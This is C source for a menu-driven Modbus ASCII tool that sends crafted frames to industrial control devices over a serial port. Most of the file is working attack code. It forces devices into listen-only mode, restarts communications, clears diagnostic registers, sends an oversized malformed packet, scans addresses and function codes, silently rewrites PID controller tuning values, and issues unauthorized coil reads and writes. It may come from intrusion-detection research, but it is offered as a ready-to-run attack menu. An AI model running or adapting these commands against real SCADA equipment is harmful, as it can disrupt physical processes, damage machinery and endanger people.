void sendascii(int port, unsigned char addr, unsigned char fc, const char *tempbytes);
void handleresp(int port);
void forcelisten(int fp, struct timespec req, struct timespec rem);
void restartcommunication(int mtu, struct timespec req, struct timespec rem);
void clear_cunters_diagnostic(int mtu, struct timespec req, struct timespec rem);
void read_device_id(int mtu, struct timespec req, struct timespec rem);
void report_server_info(int mtu, struct timespec req, struct timespec rem);
void illegal_packet_size(int mtu, struct timespec req, struct timespec rem);
void slave_busy_code(int mtu, struct timespec req, struct timespec rem);
void ack_exception_code(int mtu, struct timespec req, struct timespec rem);
void points_scan(int mtu, struct timespec req, struct timespec rem);
void function_code_scan(int mtu, struct timespec req, struct timespec rem);
void pid_cycletime_change(int mtu, struct timespec req, struct timespec rem);
void pid_deadband_change(int mtu, struct timespec req, struct timespec rem);
void pid_reset_change(int mtu, struct timespec req, struct timespec rem);
void pid_rate_change(int mtu, struct timespec req, struct timespec rem);
void pid_gain_change(int mtu, struct timespec req, struct timespec rem);
void address_scan(int mtu, struct timespec req, struct timespec rem, int add);
void Unauthorized_Read_Request(int mtu, struct timespec req, struct timespec rem);
void Unauthorized_Write_Request(int mtu, struct timespec req, struct timespec rem);
void printmenu(void);
int get_code(int num);
void StrToHex(unsigned char *lpBuffer, int Total);
void sendascii_old(int port, unsigned char addr, unsigned char fc, const char *tempbytes);

void handleresp(int port) {
  struct modbus_record *response;
  response = getmodbus_ascii_timed(port);
  printf("response received ...\n");
  printmodbusrec(response);
  freerec(response);
}

void sendascii(int port, unsigned char addr, unsigned char fc, const char *tempbytes) {
  int i;
  unsigned char data[512];
  int charlen;
  int datalen;
  struct modbus_record *command;

  strcpy(data, tempbytes);
  charlen = strlen(data)/2;
  datalen = strlen(data);
  StrToHex(data, datalen);

  command = malloc(sizeof(struct modbus_record));
  command->pdu = mkpdu(addr, fc, data, charlen, NULL);

  sendmodbus_ascii_timed(port, command);
  printf("command sent ...\n");
  printmodbusrec(command);
  freerec(command);
  return;
}

void forcelisten(int mtu, struct timespec req, struct timespec rem) {

  sendascii_old(mtu,4,8,"00040000");
  handleresp(mtu);
  nanosleep(&req, &rem);  
}

void restartcommunication(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,4,8,"00010000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void clear_cunters_diagnostic(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,4,8,"000A0000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void read_device_id(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,4,43,"0e030100");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void report_server_info(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,4,17,"11");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void illegal_packet_size(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,4,6,"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void slave_busy_code(int mtu, struct timespec req, struct timespec rem){

  sendascii(mtu,3,0x81,"0000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void ack_exception_code(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,5,0x81,"00000000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}


void points_scan(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,6,0x81,"00000000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void function_code_scan(int mtu, struct timespec req, struct timespec rem){

  sendascii_old(mtu,7,0x81,"00000000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void pid_cycletime_change(int mtu, struct timespec req, struct timespec rem){
  sendascii(mtu, 4, 3, "0bb70009");
  handleresp(mtu);
  nanosleep(&req, &rem);

  sendascii(mtu, 4, 10, "0be900122400010000000000000000000042700000730000003e4ccccd000000003f0000003f800001");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void pid_deadband_change(int mtu, struct timespec req, struct timespec rem){
  sendascii(mtu, 4, 3, "0bb70009");
  handleresp(mtu);
  nanosleep(&req, &rem);

  sendascii(mtu, 4, 10, "0be900122400010000000000000000000042700000730000003e4ccccd000000003f1000003f800000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void pid_reset_change(int mtu, struct timespec req, struct timespec rem){
  sendascii(mtu, 4, 3, "0bb70009");
  handleresp(mtu);
  nanosleep(&req, &rem);

  sendascii(mtu, 4, 10, "0be900122400010000000000000000000042700000730000003c5ccccd000000003f0000003f800000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void pid_rate_change(int mtu, struct timespec req, struct timespec rem){
  sendascii(mtu, 4, 3, "0bb70009");
  handleresp(mtu);
  nanosleep(&req, &rem);

  sendascii(mtu, 4, 10, "0be900122400010000000000000000000042700000730000003e4ccccd000100003f0000003f800000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void pid_gain_change(int mtu, struct timespec req, struct timespec rem){
  sendascii(mtu, 4, 3, "0bb70009");
  handleresp(mtu);
  nanosleep(&req, &rem);

  sendascii(mtu, 4, 10, "0be900122400010000000000000000000042700000530000003e4ccccd000000003f0000003f800000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void address_scan(int mtu, struct timespec req, struct timespec rem, int add){
  sendascii(mtu, 4, 3, "0bb70009");
  handleresp(mtu);
  nanosleep(&req, &rem);

  sendascii(mtu, add, 10, "0be900122400010000000000000000000042700000730000003e4ccccd000000003f0000003f800000");
  handleresp(mtu);
  nanosleep(&req, &rem);
}

void Unauthorized_Read_Request(int mtu, struct timespec req, struct timespec rem){
  // Unauthorized Read Request (read coil)
  sendascii(mtu,3,0x01,"0000010018");
  handleresp(mtu);
  nanosleep(&req, &rem);
 
  //Unauthorized Read Request (read coil)
  sendascii(mtu,3,0x01,"0000020018");
  handleresp(mtu);
  nanosleep(&req, &rem);  

  // Unauthorized Read Request (read multiple)
  sendascii(mtu,3,0x01,"0000040018");
  handleresp(mtu);
  nanosleep(&req, &rem);  
}

void Unauthorized_Write_Request(int mtu, struct timespec req, struct timespec rem){
  sendascii(mtu,4,0x05,"00020000");
  handleresp(mtu);
  nanosleep(&req, &rem);

  // Unauthorized Write Request (write coil)
  sendascii(mtu,4,0x05,"00010000");
  handleresp(mtu);
  nanosleep(&req, &rem);

  // Unauthorized Write Request (write single register)
  sendascii(mtu,4,0x05,"0005000b");
  handleresp(mtu);
  nanosleep(&req, &rem);
}
void printmenu(void){
  
  int i = 1;
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|  number  |  option                                                             |\n");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                          |\n", i++, "Force Listen Only Mode"); 
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                   |\n", i++, "Restart Communications Option");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                         |\n", i++,  "Clear Counters and Diagnostic Registers");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                      |\n", i++,  "Read Device Identification");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                       |\n", i++,  "Report Server Information");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                             |\n", i++,  "illegal packet size");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                       |\n", i++,  "slave busy exception code");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                      |\n", i++,  "acknowledge exception code");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d      |     %s                                                     |\n", i++,  "points scan");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d     |     %s                                              |\n", i++,  "function code scan");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d     |     %s                                            |\n", i++,  "PID parameter change");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d     |     %s                                               |\n", i++,  "SCADA device scan");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d     |     %s                                       |\n", i++,  "Unauthorized Read Request");
  printf("+--------------------------------------------------------------------------------+\n");
  printf("|   %d     |     %s                                      |\n", i++,  "Unauthorized Write Request");
  printf("+--------------------------------------------------------------------------------+\n");



 //for future add options
 

}

int get_code(int num){

  int n;
  printf("Input option:  ");
  scanf("%d", &n);
  if((n>num)||(n<=0)){
   perror("Invalid option input, quit....");
   exit(1);
} 
  else
    return n;
}



void StrToHex(unsigned char *lpBuffer, int Total){
  if((Total%2) != 0)
   {
    strcat((char *)lpBuffer, "0");
    Total++;
   }
  unsigned char HexBuffer[255];

  memset(HexBuffer,'\0',255);

  int i;
for(i=0; i<Total; i++)
{
  if(lpBuffer[i] > 0x39)
   lpBuffer[i] -= 87;
  else
   lpBuffer[i] -= 0x30;

}
for(i=0;i<Total;i+=2)
{
HexBuffer[i/2]=lpBuffer[i];
HexBuffer[i/2]<<=4;

HexBuffer[i/2] |= lpBuffer[i+1];
}
Total /= 2   ;
memcpy(lpBuffer,HexBuffer,Total);

}

void sendascii_old(int port, unsigned char addr, unsigned char fc, const char *tempbytes) {
  int i;
  unsigned char data[255];
  struct modbus_record *command;

  for(i=0;i<strlen(tempbytes);i+=2) {
    tobinary(data + (i/2), tempbytes[i], tempbytes[i+1]);
  }
  command = malloc(sizeof(struct modbus_record));
  command->pdu = mkpdu(addr, fc, data, strlen(tempbytes)/2, NULL);

  sendmodbus_ascii_timed(port, command);
  printf("command sent ...\n");
  printmodbusrec(command);
  freerec(command);
  return;
}



